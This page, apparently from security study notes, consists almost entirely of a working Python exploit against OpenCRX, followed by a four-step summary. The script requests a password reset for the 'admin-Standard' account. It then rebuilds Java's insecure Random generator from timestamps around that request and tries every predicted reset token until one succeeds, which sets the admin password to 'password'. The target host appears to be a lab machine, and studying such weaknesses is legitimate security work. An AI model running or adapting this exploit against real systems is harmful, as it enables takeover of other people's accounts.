---
description: Java
---

# OpenCRX

{% code overflow="wrap" %}
```python
import requests
import time

# -----Config-----
PROXY = "http://127.0.0.1:8080"

# -----Session setup-----
session = requests.Session()
session.proxies = {"http": PROXY, "https": PROXY}
session.verify = False
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# -----Replicate Insecure Java Random class-----
class JavaRandom:
    def __init__(self, seed):
        self.seed = (seed ^ 0x5DEECE66D) & ((1 << 48) - 1)

    def next(self, bits):
        self.seed = (self.seed * 0x5DEECE66D + 0xB) & ((1 << 48) - 1)
        return self.seed >> (48 - bits)

    def nextInt(self, n):
        if n <= 0:
            raise ValueError("n must be positive")
        if (n & (n - 1)) == 0:  # n is power of 2
            return (n * self.next(31)) >> 31
        while True:
            bits = self.next(31)
            val = bits % n
            if bits - val + (n - 1) >= 0:
                return val

# Test connection
def init_connection_test():
    try:
        response = session.get("http://opencrx:8080/opencrx-core-CRX", verify=False)
        print("[*] Initial connection test success.")
        return True
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return 0

def get_random_base62(start_time, end_time):
    length = 40
    tokens = []
    alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    for l in range(start_time, end_time):
        rng = JavaRandom(l)
        token = ''.join(alphabet[rng.nextInt(62)] for _ in range(length))
        tokens.append(token)
    return tokens

# Generate password reset token and loop
def password_reset():
    username = "admin-Standard"
    data = {'id':username}
    success = False
    start_time = int(time.time() * 1000) - 200
    response = session.post("http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp", data=data, verify=False)
    if 'Unable to request password reset' in response.text:
        print(f"[!] Account {username} not found.")
        return
    end_time = int(time.time() * 1000) + 200
    tokens = get_random_base62(start_time, end_time)
    print(f"[!] Attempting to reset password for {username} with {len(tokens)} combinations.")
    for item in tokens:
        data = {'t':item, 'p':'CRX','s':'Standard','id':username,'password1':'password','password2':'password'}

        response = session.post("http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp", data=data)
        res = response.text
        time.sleep(0.5)

        if "Unable to reset password" not in res:
            print(f"[*] Successful reset with token: {item}\nSign in with credential {username}:password")
            success = True
            break
    if success:
        return True
    else:
        print("[!] No valid token found.")
        return False

def main():
    if init_connection_test():
         password_reset()

if __name__ == "__main__":
    main()
```
{% endcode %}

1. Send password reset request with valid username.
2. Get the timestamp of password reset confirm request.
3. Generate list of tokens with the insecure java Random function.
4. Loop through generated token and attempt to reset password.
